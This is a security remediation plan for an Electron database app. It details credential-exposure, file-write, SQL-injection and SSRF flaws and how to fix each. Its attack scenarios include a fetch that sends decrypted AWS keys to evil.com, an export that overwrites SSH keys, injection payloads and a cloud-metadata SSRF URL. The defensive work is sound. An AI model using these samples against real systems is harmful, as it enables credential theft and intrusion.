# Security Remediation Plan - v0.2.0 Pre-Release

**Date**: 2025-12-03
**Security Review By**: Codex AI
**Status**: Pre-Implementation
**Target**: Fix all P1/P2 issues before v0.2.0 release

---

## Executive Summary

Codex identified **2 High-Severity (P1)** and **2 Medium-Severity (P2)** security vulnerabilities that must be fixed before v0.2.0 production release. The application has good foundational security (process isolation, CSP, credential encryption), but these issues could allow credential theft, arbitrary file writes, SQL injection, and SSRF attacks.

**Critical Finding**: Credential decryption API exposed to renderer process - any XSS or renderer compromise can dump all stored AWS keys.

---

## Findings Summary

### P1 - High Severity (Fix Before Release)

| ID | Issue | Impact | Files Affected |
|---|---|---|---|
| **P1-1** | Credential decrypt exposed to renderer | **Credential theft** - Any renderer compromise can dump all AWS secrets | `src/preload/preload.ts:121-128`<br>`src/main/ipcHandlers.ts:584-612` |
| **P1-2** | Arbitrary file write via export IPCs | **System file overwrite** - Can silently overwrite ~/.ssh/authorized_keys, shell RC files | `src/preload/preload.ts:105-119`<br>`src/main/ipcHandlers.ts:145-205`<br>`src/main/DuckDBService.ts:537-615` |

### P2 - Medium Severity (Fix in v0.2.0)

| ID | Issue | Impact | Files Affected |
|---|---|---|---|
| **P2-1** | SQL injection in extension loading & S3 config | **SQL injection** - Tampered profiles.json can inject statements on connection open | `src/main/DuckDBService.ts:73-76`<br>`src/main/DuckDBService.ts:252-272` |
| **P2-2** | Remote file/S3 SSRF with stored credentials | **SSRF attack** - Malicious profiles can access intranet services with user's AWS credentials | `src/renderer/components/AttachedFileList.tsx:20-134`<br>`src/main/DuckDBService.ts:84-95, 207-319`<br>`src/renderer/components/S3ConfigForm.tsx:126-281` |

---

## Detailed Remediation Plans

### P1-1: Remove Decrypt IPC (Credential Theft)

**Vulnerability**: Renderer can call `window.orbitalDb.credentials.decrypt()` to retrieve plaintext AWS secrets.

**Attack Scenario**:
```typescript
// Malicious code in compromised renderer
const profiles = await window.orbitalDb.profiles.list();
for (const profile of profiles) {
  if (profile.s3Config) {
    const secrets = await window.orbitalDb.credentials.decrypt(
      profile.s3Config.accessKeyId,
      profile.s3Config.secretAccessKey
    );
    // Exfiltrate to attacker server
    fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(secrets) });
  }
}
```

**Remediation Strategy**:

1. **Remove `decrypt` from preload API** entirely (src/preload/preload.ts:121-128)
2. **Redesign S3 credential editing flow**:
   - Credentials are **write-only** from UI perspective
   - When editing S3 config, show masked values: `accessKeyId: "AKIA...XXXX"` (first 4 + last 4 chars)
   - Require user to re-enter secrets if changing them
   - Never send plaintext credentials to renderer
3. **Decrypt only in main process** when opening connection (already done in DuckDBService.ts:219-284)
4. **Optional enhancement**: Prompt OS keychain UI on decrypt for additional security

**Files to Modify**:
- `src/preload/preload.ts` - Remove `credentials.decrypt` from contextBridge
- `src/preload/index.d.ts` - Remove decrypt from type definitions
- `src/main/ipcHandlers.ts` - Remove decrypt IPC handler (lines 584-612)
- `src/renderer/components/S3ConfigForm.tsx` - Show masked credentials, make write-only
- `src/main/CredentialManager.ts` - Add `maskCredential()` helper for display

**Implementation Complexity**: Medium
**Estimated Effort**: 2-3 hours
**Testing Required**:
- Verify S3 connections still work
- Confirm credentials cannot be retrieved via IPC
- Test editing existing S3 profiles

---

### P1-2: Fix Arbitrary File Write (Export Functions)

**Vulnerability**: Renderer controls export file paths without validation, allowing arbitrary file overwrites.

**Attack Scenario**:
```typescript
// Malicious code in compromised renderer
await window.orbitalDb.query.exportCsv(
  profileId,
  'SELECT \'\' AS evil_payload',
  '/Users/victim/.ssh/authorized_keys'  // Overwrite SSH keys
);
```

**Remediation Strategy**:

1. **Move file dialogs to main process** (already using `dialog.showSaveDialog` but passing path to renderer)
2. **Use opaque file handles instead of paths**:
   - Main process shows save dialog
   - Main process gets file path
   - Main process performs export directly
   - Renderer never sees or controls the file path
3. **Validation fallback** (defense-in-depth):
   - Maintain allowlist of user-chosen export directories
   - Reject paths outside allowlist
   - Reject paths containing `..` or other traversal patterns
   - Reject paths to sensitive system directories (`/etc`, `~/.ssh`, `C:\Windows\System32`, etc.)

**Implementation Approach**:

```typescript
// BEFORE (vulnerable):
// Renderer gets path from dialog, sends to main
const filePath = await window.orbitalDb.files.selectExportFile();
await window.orbitalDb.query.exportCsv(profileId, sql, filePath);

// AFTER (secure):
// Main process owns entire export flow
await window.orbitalDb.query.exportCsv(profileId, sql, format);
// Main process shows dialog, validates path, performs export
```

**Files to Modify**:
- `src/main/ipcHandlers.ts` - Move file dialog logic into export handlers (lines 145-205)
- `src/main/DuckDBService.ts` - Add path validation in export functions (lines 537-615)
- `src/preload/preload.ts` - Remove `selectExportFile`, modify export APIs (lines 105-119)
- `src/renderer/routes/QueryTab.tsx` - Simplify export calls (remove separate file selection)
- `src/renderer/routes/TablePage.tsx` - Simplify export calls

**Implementation Complexity**: Medium
**Estimated Effort**: 3-4 hours
**Testing Required**:
- Verify exports still work for CSV, JSON, Parquet
- Test that invalid paths are rejected
- Confirm file dialogs show correct default locations

---

### P2-1: Fix SQL Injection in Extension Loading & S3 Config

**Vulnerability**: Extension names and S3 URL styles are interpolated without escaping.

**Attack Scenario**:
```json
// Malicious profiles.json
{
  "extensions": ["httpfs'; DROP TABLE users; --"],
  "s3Config": {
    "urlStyle": "path'; COPY secrets TO '/tmp/exfil.csv'; --"
  }
}
```

**Remediation Strategy**:

1. **Extension loading** (src/main/DuckDBService.ts:73-76):
   ```typescript
   // BEFORE (vulnerable):
   await connection.run(`LOAD '${extension}'`);

   // AFTER (secure):
   const escaped = extension.replace(/'/g, "''");
   await connection.run(`LOAD '${escaped}'`);

   // OR use allowlist:
   const ALLOWED_EXTENSIONS = ['httpfs', 'parquet', 'json', 'icu'];
   if (!ALLOWED_EXTENSIONS.includes(extension)) {
     throw new Error(`Extension not allowed: ${extension}`);
   }
   await connection.run(`LOAD '${extension}'`);
   ```

2. **S3 URL style** (src/main/DuckDBService.ts:252-272):
   ```typescript
   // BEFORE (vulnerable):
   secretStatements.push(`SET s3_url_style='${s3Config.urlStyle}'`);

   // AFTER (secure):
   const ALLOWED_STYLES = ['vhost', 'path'];
   if (!ALLOWED_STYLES.includes(s3Config.urlStyle)) {
     throw new Error(`Invalid S3 URL style: ${s3Config.urlStyle}`);
   }
   secretStatements.push(`SET s3_url_style='${s3Config.urlStyle}'`);
   ```

3. **Apply same pattern to all SQL interpolations**:
   - Search codebase for `connection.run(\`...\${` patterns
   - Either escape with `replace(/'/g, "''")` or use allowlists
   - Prefer allowlists for enums (urlStyle, extension names)

**Files to Modify**:
- `src/main/DuckDBService.ts` - Add validation/escaping (lines 73-76, 252-272)
- Search for other SQL interpolation vulnerabilities

**Implementation Complexity**: Low
**Estimated Effort**: 1-2 hours
**Testing Required**:
- Test loading valid extensions (httpfs, parquet)
- Verify S3 connections work with both URL styles
- Confirm malicious values are rejected

---

### P2-2: Implement SSRF Protections for Remote Files/S3

**Vulnerability**: Attached files and S3 endpoints accept arbitrary URLs without validation.

**Attack Scenario**:
```typescript
// Malicious profile with internal metadata endpoint
{
  "attachedFiles": [
    { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
  ],
  "s3Config": {
    "endpoint": "http://localhost:9000",  // Attacker-controlled MinIO
    "accessKeyId": "...",
    "secretAccessKey": "..."
  }
}
```

**Remediation Strategy**:

1. **URL Validation**:
   ```typescript
   function validateRemoteUrl(url: string): void {
     const parsed = new URL(url);

     // Only allow HTTP/HTTPS
     if (!['http:', 'https:'].includes(parsed.protocol)) {
       throw new Error('Only HTTP/HTTPS protocols allowed');
     }

     // Block loopback
     if (['localhost', '127.0.0.1', '::1'].includes(parsed.hostname)) {
       throw new Error('Loopback addresses not allowed');
     }

     // Block link-local/private CIDRs
     const blockedRanges = [
       /^10\./,                    // 10.0.0.0/8
       /^172\.(1[6-9]|2[0-9]|3[01])\./, // 172.16.0.0/12
       /^192\.168\./,              // 192.168.0.0/16
       /^169\.254\./,              // 169.254.0.0/16 (AWS metadata)
       /^fd[0-9a-f]{2}:/i,         // IPv6 ULA
       /^fe80:/i                   // IPv6 link-local
     ];

     if (blockedRanges.some(r => r.test(parsed.hostname))) {
       throw new Error('Private/internal IP addresses not allowed');
     }
   }
   ```

2. **User Confirmation**:
   - When attaching remote file, show hostname to user and require confirmation
   - Warn if S3 endpoint is not standard AWS endpoint
   - Log all remote connections for audit

3. **S3 Endpoint Allowlist**:
   ```typescript
   const TRUSTED_S3_ENDPOINTS = [
     's3.amazonaws.com',
     's3.us-east-1.amazonaws.com',
     's3.us-west-2.amazonaws.com',
     // ... other AWS regions
   ];

   function validateS3Endpoint(endpoint?: string): void {
     if (!endpoint) return; // Default AWS endpoint

     const parsed = new URL(endpoint.startsWith('http') ? endpoint : `https://${endpoint}`);

     if (!TRUSTED_S3_ENDPOINTS.some(trusted => parsed.hostname.endsWith(trusted))) {
       console.warn(`Custom S3 endpoint: ${parsed.hostname}`);
       // Could show user confirmation dialog here
     }

     validateRemoteUrl(endpoint); // Apply general URL validation
   }
   ```

**Files to Modify**:
- `src/main/DuckDBService.ts` - Add URL validation (lines 84-95, 207-319)
- `src/renderer/components/AttachedFileList.tsx` - Show hostname, require confirmation (lines 20-134)
- `src/renderer/components/S3ConfigForm.tsx` - Warn on custom endpoints (lines 126-281)
- Create new file: `src/main/utils/urlValidation.ts` - URL validation helpers

**Implementation Complexity**: Medium
**Estimated Effort**: 2-3 hours
**Testing Required**:
- Test with legitimate S3 buckets
- Test with HTTP file attachments
- Verify private IPs are blocked
- Confirm user warnings appear

---

## Additional Recommendations

### 5. Automated Dependency Auditing

**Current State**: No automated dependency scanning in CI.

**Implementation**:

1. **Add to CI pipeline** (.github/workflows/build.yml):
   ```yaml
   - name: Security audit
     run: |
       npm audit --production --audit-level=high
       npx osv-scanner --lockfile=package-lock.json
   ```

2. **Pre-commit hook** (optional):
   ```bash
   npm audit --production --audit-level=critical
   ```

3. **Regular updates**:
   - Schedule weekly `npm audit fix` runs
   - Review and update dependencies monthly
   - Monitor GitHub Dependabot alerts

**Implementation Complexity**: Low
**Estimated Effort**: 30 minutes
**Testing Required**: Verify CI fails on high/critical vulnerabilities

---

### 6. IPC Validation Layer

**Current State**: IPC handlers trust input from renderer without validation.

**Implementation**:

1. **Create validation utilities** (src/main/utils/ipcValidation.ts):
   ```typescript
   import { z } from 'zod';

   export function validateIpcInput<T>(schema: z.ZodSchema<T>, input: unknown): T {
     const result = schema.safeParse(input);
     if (!result.success) {
       throw new Error(`IPC validation failed: ${result.error.message}`);
     }
     return result.data;
   }

   // Example schemas
   export const ProfileIdSchema = z.string().uuid();
   export const SqlQuerySchema = z.string().max(1000000); // 1MB limit
   export const FilePathSchema = z.string().refine(
     path => !path.includes('..'),
     'Path traversal not allowed'
   );
   ```

2. **Apply to all IPC handlers**:
   ```typescript
   // BEFORE:
   ipcMain.handle('orbitalDb:query:run', async (event, profileId, sql) => {
     return duckDBService.runQuery(profileId, sql);
   });

   // AFTER:
   ipcMain.handle('orbitalDb:query:run', async (event, profileId, sql) => {
     const validProfileId = validateIpcInput(ProfileIdSchema, profileId);
     const validSql = validateIpcInput(SqlQuerySchema, sql);
     return duckDBService.runQuery(validProfileId, validSql);
   });
   ```

3. **Add tests**:
   - Unit tests for validation schemas
   - Integration tests that verify invalid input is rejected
   - CI enforcement

**Implementation Complexity**: Medium
**Estimated Effort**: 3-4 hours
**Testing Required**: Test each IPC handler with invalid input

---

## Implementation Timeline

### Phase 1: Critical Fixes (3-4 days)

**Day 1-2: P1-1 Credential Security**
- [ ] Remove decrypt IPC from preload
- [ ] Implement masked credential display
- [ ] Make S3 config form write-only
- [ ] Test S3 connections still work

**Day 2-3: P1-2 Export File Security**
- [ ] Move export logic to main process
- [ ] Implement path validation
- [ ] Update renderer export calls
- [ ] Test all export formats

### Phase 2: Medium Severity Fixes (2-3 days)

**Day 4-5: P2-1 SQL Injection**
- [ ] Add extension allowlist
- [ ] Validate S3 URL style
- [ ] Audit all SQL interpolations
- [ ] Add escaping where needed

**Day 5-6: P2-2 SSRF Protection**
- [ ] Implement URL validation utilities
- [ ] Add private IP blocking
- [ ] Add user confirmation for remote files
- [ ] Test with various URL patterns

### Phase 3: Infrastructure Improvements (1-2 days)

**Day 7: Dependency Auditing & IPC Validation**
- [ ] Add npm audit to CI
- [ ] Add osv-scanner to CI
- [ ] Create IPC validation utilities
- [ ] Apply to high-risk handlers

### Phase 4: Testing & Verification (1-2 days)

**Day 8-9: Security Testing**
- [ ] Manual penetration testing
- [ ] Verify all findings are fixed
- [ ] Update SECURITY_AUDIT_REQUEST.md with results
- [ ] Document security improvements in ROADMAP.md

**Total Estimated Time**: 7-10 days

---

## Testing Checklist

### P1-1 Testing (Credential Security)
- [ ] Attempt to call `window.orbitalDb.credentials.decrypt()` - should not exist
- [ ] Open dev tools, try to access credentials via IPC - should fail
- [ ] Edit S3 profile, verify credentials are masked
- [ ] Save new S3 credentials, verify connection works
- [ ] Reopen S3 profile, verify credentials still masked

### P1-2 Testing (Export Security)
- [ ] Export CSV to normal location - should work
- [ ] Attempt to export to `/etc/passwd` via UI - should fail gracefully
- [ ] Attempt to export to `../../../etc/passwd` - should be blocked
- [ ] Export to `~/.ssh/test.csv` - should be blocked or warned
- [ ] Export to user Documents folder - should work

### P2-1 Testing (SQL Injection)
- [ ] Load valid extension (httpfs) - should work
- [ ] Manually edit profiles.json with malicious extension name - should be rejected
- [ ] Set S3 URL style to 'vhost' - should work
- [ ] Set S3 URL style to 'path' - should work
- [ ] Set S3 URL style to malicious value - should be rejected

### P2-2 Testing (SSRF)
- [ ] Attach public HTTP file - should work with confirmation
- [ ] Attach `http://localhost:8080/file.csv` - should be blocked
- [ ] Attach `http://169.254.169.254/metadata` - should be blocked
- [ ] Attach `http://10.0.0.1/file.csv` - should be blocked
- [ ] Configure S3 with AWS endpoint - should work
- [ ] Configure S3 with custom endpoint - should warn user

### Dependency Auditing Testing
- [ ] Run `npm audit --production` - no high/critical issues
- [ ] CI build fails if vulnerabilities found
- [ ] Dependabot alerts are monitored

### IPC Validation Testing
- [ ] Send malformed profile ID to IPC handler - should error gracefully
- [ ] Send extremely long SQL query - should be rejected or limited
- [ ] Send path with `..` traversal - should be rejected

---

## Success Criteria

**Before v0.2.0 can be released**:

✅ All P1 (High) issues resolved and tested
✅ All P2 (Medium) issues resolved and tested
✅ Automated dependency auditing in CI
✅ Manual security testing completed
✅ No high/critical npm audit findings
✅ IPC validation layer implemented for high-risk handlers
✅ Security improvements documented

**Optional (can defer to v0.2.1)**:
- Comprehensive IPC validation on all handlers
- Automated security testing in CI
- Third-party security audit
- Bug bounty program

---

## Post-Remediation Steps

1. **Update SECURITY_AUDIT_REQUEST.md** with remediation results
2. **Document security features** in README.md
3. **Create SECURITY.md** with responsible disclosure policy
4. **Tag v0.2.0** only after all P1/P2 issues are fixed
5. **Monitor for security issues** post-release
6. **Plan v0.2.1** for any remaining improvements

---

## Contact & Questions

For questions during remediation:
- **Security Review**: Codex AI
- **Development**: Jamie Ontiveros
- **Repository**: https://github.com/audit-brands/orbital-db

---

**This plan ensures v0.2.0 ships with strong security posture while maintaining all existing functionality.**
